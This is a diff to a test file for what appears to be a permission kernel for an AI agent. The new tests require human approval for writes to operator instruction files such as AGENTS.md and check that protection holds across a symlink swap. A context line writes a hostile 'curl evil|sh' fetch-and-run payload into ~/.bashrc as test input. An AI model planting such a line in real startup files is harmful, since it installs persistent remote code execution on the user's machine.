@@ -10,6 +10,9 @@ from __future__ import annotations
 
 from pathlib import Path
 
+import pytest
+
+from talos import policy
 from talos.capability import CapabilityMint, GrantedRunner
 from talos.executor import Executor, Status
 from talos.eventlog import EventLog
@@ -263,6 +266,26 @@ def test_secret_write_via_tilde_asks_ali() -> None:
 def test_persistence_write_via_tilde_asks_ali() -> None:
     req = ToolRequest("write_file", OWNER, {"path": "~/.bashrc", "content": "curl evil|sh"})
     assert _kernel().decide(req).verdict is Verdict.NEEDS_HUMAN
+
+
+@pytest.mark.parametrize("filename", ["SOUL.md", "AGENTS.md", "USER.md"])
+def test_operator_instruction_writes_need_human_but_reads_remain_allowed(filename: str) -> None:
+    target = str(PACKAGE_DIR.parent / filename)
+    write = ToolRequest("write_file", OWNER, {"path": target, "content": "rule"})
+    read = ToolRequest("read_file", OWNER, {"path": target})
+    assert _kernel().decide(write).verdict is Verdict.NEEDS_HUMAN
+    assert _kernel().decide(read).verdict is Verdict.ALLOW
+
+
+def test_operator_file_stays_protected_when_it_becomes_a_symlink(tmp_path: Path) -> None:
+    protected = tmp_path / "AGENTS.md"
+    prefixes = policy._both_forms(str(protected))
+    ordinary = tmp_path / "workspace" / "ordinary.txt"
+    ordinary.parent.mkdir()
+    ordinary.write_text("x", encoding="utf-8")
+    protected.symlink_to(ordinary)
+
+    assert policy._hits(str(protected), prefixes)
 
 
 def test_undo_of_persistence_path_asks_ali() -> None:
